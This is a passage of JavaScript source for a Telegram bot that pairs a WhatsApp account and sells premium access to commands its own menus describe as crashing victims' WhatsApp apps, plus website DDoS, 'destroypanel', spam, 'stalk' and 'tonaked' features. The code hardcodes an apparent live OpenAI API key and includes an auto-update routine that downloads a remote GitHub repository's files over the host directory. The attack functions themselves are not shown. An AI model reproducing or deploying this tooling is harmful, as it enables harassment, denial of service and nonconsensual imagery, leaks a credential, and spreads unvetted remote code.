        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); 
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const { OpenAI } = require('openai');
const openaiKey = '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'
const openai = new OpenAI({ apiKey: openaiKey });

// --------- ( Fungsi Tambahan ) --------- \\

async function getFileLink(fileId, tokenBot) {
              const res = await axios.get(`https://api.telegram.org/bot${tokenBot}/getFile?file_id=${fileId}`);
                  if (!res.data.ok) throw new Error("Gagal ambil file path");
                  return `https://api.telegram.org/file/bot${tokenBot}/${res.data.result.file_path}`;
              }

const startSesi = async () => {
console.clear();
console.log(chalk.bold.rgb(235, 215, 0)(`
「 ザイラ、ゼノビア、ゼニッサ 」
Bot Sukses Terhubung Terimakasih
⚌⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`)); 
console.log(chalk.bold.rgb(65, 105, 255)(`
⬡═―—⊱ VINZEPH PROTECT ⊰―—═⬡
|  ✅  Token Valid Dan Terverifikasi
⬡═―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—―—═⬡`));

const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        const date = getCurrentDate();
        
        if (lastPairingMessage) {
        const connectedMenu = `
┏━━━━━━━━━━━━━┓
┃⌦「 Status Connect 」
┃⌦ WhatsApp Terhubung
┗━━━━━━━━━━━━━┛
`;

        try {
          bot.telegram.editMessageText(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
    
      const date = getCurrentDate();
      
      const updateConnectionMenu = `
┏━━━━━━━━━━━━━┓
┃⌦「 Status Connect 」
┃⌦ WhatsApp Terhubung
┗━━━━━━━━━━━━━┛
`;

      try {  
        await bot.telegram.editMessageText(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const GH_OWNER = "VinzExorc1st";
const GH_REPO = "TrashAutoUpdate";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    try {
        const { data } = await axios.get(url, {
            headers: { "User-Agent": "Mozilla/5.0" }
        });

        for (const item of data) {
            const local = path.join(basePath, item.path);

            if (item.type === "file") {
                const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
                fs.mkdirSync(path.dirname(local), { recursive: true });
                fs.writeFileSync(local, Buffer.from(fileData.data));
                console.log("[UPDATE] Mengunduh:", item.path);
            }

            if (item.type === "dir") {
                fs.mkdirSync(local, { recursive: true });
                await downloadRepo(item.path, basePath);
            }
        }
    } catch (e) {
        throw e; 
    }
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkAdmin = (ctx, next) => {
    if (!isAdmin(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk admin");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

    const phoneNumber = args.replace(/[^0-9]/g, "");
    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

    try {
        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
        if (sock.authState.creds.registered) {
            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
        }

        const date = getCurrentDate();
        const code = await sock.requestPairingCode(phoneNumber, "VINZZELL");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMenu = `
<blockquote>TrasH ⵢ MatriX°Connection</blockquote>
𖥂 Number: ${phoneNumber}  
𖥂 Pairing Code: ${formattedCode}  
𖥂 Date : ${date}
`;

        const sentMsg = await ctx.reply(pairingMenu, {
            parse_mode: "HTML"
        });

        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode
        };

    } catch (err) {
        console.error(err);
    }
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /addpremium <id duration>\nExample : /addpremium 12345678 30d\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /delpremium <id>\nExample : /delpremium 12345678\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /addgcpremium <id duration>\nExample : /addgcpremium -12345678 30d\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /delpremium <id>\nExample : /delpremium -12345678\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /addadmin <id>\nExample : /addadmin 12345678\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("❌ Syntax Error!\n\nUse : /deladmin <id>\nExample : /deladmin 12345678\n\n© 𖣂-vinzεphyr. ẽscãnnõr. ϟ");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
        try { 
            await ctx.reply("🔎 ☇ Sedang memvalidasi token", { reply_to_message_id: ctx.message.message_id });
        } catch(e) {}
        return;
    }

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();

    const menuMessage = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
        [
            { text: "𝑶𝒑𝒆𝒏 𝑴𝒆𝒏𝒖「🔜」", callback_data: "/controls" }
        ],
        [
            { text: "𝑼𝒑𝒅𝒂𝒕𝒆 𝑺𝒄𝒓𝒊𝒑𝒕「🆙」", callback_data: "update_script" }
        ],
        [
            { text: "𖥂 𝑶𝒘𝒏𝒆𝒓 𖥂", url: "https://t.me/zellhade" },
            { text: "𖥂 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𖥂", url: "https://t.me/vinzxiterr" }
        ],
    ];

    await ctx.telegram.sendChatAction(ctx.chat.id, "typing");

    setTimeout(async () => {
        try {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: menuMessage,
                parse_mode: "HTML",
                reply_to_message_id: ctx.message.message_id,
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (e) {
            console.error("Failed to send menu:", e);
        }
    }, 1000);
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔎 ☇ Sedang memvalidasi token");
    }
    
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
  
    const menuMessage = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
        [
            { text: "𝑶𝒑𝒆𝒏 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」", callback_data: "/controls" }
        ],
        [
            { text: "𝑼𝒑𝒅𝒂𝒕𝒆 𝑺𝒄𝒓𝒊𝒑𝒕「🆙」", callback_data: "update_script" }
        ],
        [
            { text: "𖥂 𝑶𝒘𝒏𝒆𝒓 𖥂", url: "https://t.me/zellhade" },
            { text: "𖥂 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𖥂", url: "https://t.me/vinzxiterr" }
        ],
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const controlsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Premium Access Feature --
┠─ ▢ ! access premium
├─ /addpremium ‹id› ‹time›
├─ /delpremium ‹id›
├─ - !
├─── ▢ Admins Access Feature --
┠─ ▢ ! access admins
├─ /addadmin ‹id›
├─ /deladmin ‹id›
├─ - !
├─── ▢ Settings Access Feature --
┠─ ▢ ! settings menu
├─ /setcooldown ‹time›
├─ /requestpair ‹numbers›
├─ /resetsession 
├─ /autoaktif ‹time›
├─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/start"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/bug"
        }
    ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/bug', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const bugMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ -- Bug Feature --
┠─ ▢ ! buttons
├─ /execute ‹numbers›
┠─ - !
├─── ▢ -- Main Bug Feature --
┠─ ▢ ! execute main
├─ /newsletter ‹id_channel›
├─ /invoke ‹id_group›
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/controls"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/tools"
        }
    ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/tools', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const toolsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Tools Feature --
┠─ ▢ ! tools
├─ /cekbio 
├─ /cekbiotxt 
├─ /cekidch
├─ /cekidgroup
├─ /ceksyntax
├─ /cekfunction 
├─ /cekeror 
├─ /fixcode 
├─ /infofunction 
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/bug"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/main"
        }
    ]
];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/main', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const toolsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Main Feature --
┠─ ▢ ! main
├─ /play
├─ /tourl
├─ /tonaked
├─ /tofigure
├─ /spamngl
├─ /iphoneqc
├─ /removebg
├─ /sswebsite
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/tools"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/download"
        }
    ]
];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/download', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const toolsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Download Feature --
┠─ ▢ ! download
├─ /tiktokdl
├─ /videydl
├─ /mediafiredl
├─ /facebookdl
├─ /pinterestdl
├─ /instagramdl
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/main"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/stalker"
        }
    ]
];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/stalker', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const toolsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Stalk Feature --
┠─ ▢ ! stalker
├─ /ffstalk
├─ /mlbbstalk
├─ /instagramstalk
├─ /pintereststalk
├─ /threadsstalk
├─ /tiktokstalk
├─ /twitterstalk
├─ /youtubestalk
├─ /githubstalk
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/download"
        }
    ],
    [
        {
            text: "𝑵𝒆𝒙𝒕 𝑻𝒐 𝑴𝒆𝒏𝒖「🔜」",
            callback_data: "/explored"
        }
    ]
];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/explored', async(ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const date = getCurrentDate();
    const toolsMenu = `
<blockquote><b>— ( 🍂 ) Hello ${ctx.from.first_name}. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.</b></blockquote>

「  --( -! Trash ϟ Matrix #- )--  」
⬡ Author: t.me/vinzxiterr
⬡ Prefix: /
⬡ Type: ( JavaScript )
⬡ Runtime: ${runtimeStatus}

┌──────
├─── ▢ Explored Feature --
┠─ ▢ ! explored
├─ /installprotect
├─ /destroypanel
├─ /ddoswebsitev1
├─ /ddoswebsitev2
├─ /ddoswebsitev3
┠─ - ! expoed matrix
└

<code>©𖣂-vinzεphyr. ẽscãnnõr - 2025</code>`;

    const keyboard = [
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖「🔙」",
            callback_data: "/asisstant"
        }
    ],
    [
        {
            text: "𝑩𝒂𝒄𝒌 𝑻𝒐 𝑯𝒐𝒎𝒆「🏠」",
            callback_data: "/start"
        }
    ]
];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('update_script', async (ctx) => {
    await ctx.answerCbQuery(); 

    const msg = await ctx.reply("🔄 <b>Auto Update Script Mohon Tunggu</b>", { parse_mode: 'HTML' });

    try {
